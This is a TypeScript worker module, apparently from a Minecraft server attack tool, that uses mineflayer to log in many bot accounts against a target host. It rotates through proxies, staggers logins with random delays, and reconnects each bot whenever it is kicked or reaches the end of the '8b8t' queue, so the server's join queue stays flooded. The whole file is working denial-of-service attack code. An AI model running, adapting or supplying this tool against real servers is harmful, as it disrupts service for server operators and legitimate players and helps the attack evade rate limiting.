import { workerData as anyWorkerData } from 'worker_threads'
import { getRandomArbitrary, shuffleArray, sleep } from 'emberutils'
import { Bot } from 'mineflayer'
import {awaitReady, createAttackBot, kickHandler, log, randomOf, shuffle} from '../shared'
import { AttackOptions } from '../../utils/types'
import 'colors'
import prismarineChat from 'prismarine-chat'

const chatInstance = prismarineChat('1.12')
const { fromNotch } = chatInstance

async function main (): Promise<void> {
  await awaitReady()

  const spaceRegex = /\s{2,}/gm
  const workerOptions: AttackOptions = anyWorkerData
  const usernames = workerOptions.usernames
  shuffleArray(usernames)

  if (workerOptions.proxies != null) { shuffle(workerOptions.proxies) }

  const useProxies: boolean = !(workerOptions.proxies == null)

  let i = 0
  for (const username of usernames) {
    const proxy = useProxies ? randomOf(workerOptions.proxies!) : null
    log((proxy != null) ? `Using proxy ${proxy.host}:${proxy.port}`.green : 'Not using proxy'.bgRed)

    async function createBot (): Promise<Bot> {
      // join with random delay
      if (workerOptions.useTimeout) {
        // random time in range from 5s to 200s
        const timeout = getRandomArbitrary(5000, 200000)
        log(`[${username}] Waiting for ${timeout / 1000}s before logging in...`)
        // Don't continue until timeout ends
        await sleep(timeout)
      }

      return createAttackBot({
        username: username,
        host: workerOptions.host,
        port: workerOptions.port,
        proxy: useProxies
          ? (() => {
              return {
                host: proxy!.host,
                port: proxy!.port
              }
            })()
          : undefined,
        noFeatures: true
      })
    }

    log(`[${i + 1}/${usernames.length}] Creating bot ${username}... (${usernames.length - i - 1} left)`.green)
    let bot = await createBot()
    registerListeners()

    function registerListeners () {
      bot.once('login', botLoginHandler)
      bot.once('kicked', reason => kickHandler(reason, username))
    }

    function botLoginHandler () {
      log(`[${username}] Logged in`.green)
      bot.once('messagestr', async function handleMessage (message) {
        if (message === '' || message === ' ' || message === '\u200b' || !message || spaceRegex.test(message)) return
        log(`[${username}] ${message}`.yellow)
        if (message.includes('8b8t')) {
          log(`[${username}] Reached the end of the queue, ending the connection and reconnecting...`.green)
          bot.end()
          bot = await createBot()
          registerListeners()
        }
      })

      bot.once('kicked', async reason => {
        const object = fromNotch(reason)
        log(`[${username}] ${object.toString().red}`.yellow + ', recreating the bot...')
        bot.end()
        bot = await createBot()
        registerListeners()
      })
    }

    i++
  }
}

main().catch(error => {
  log(error)
})
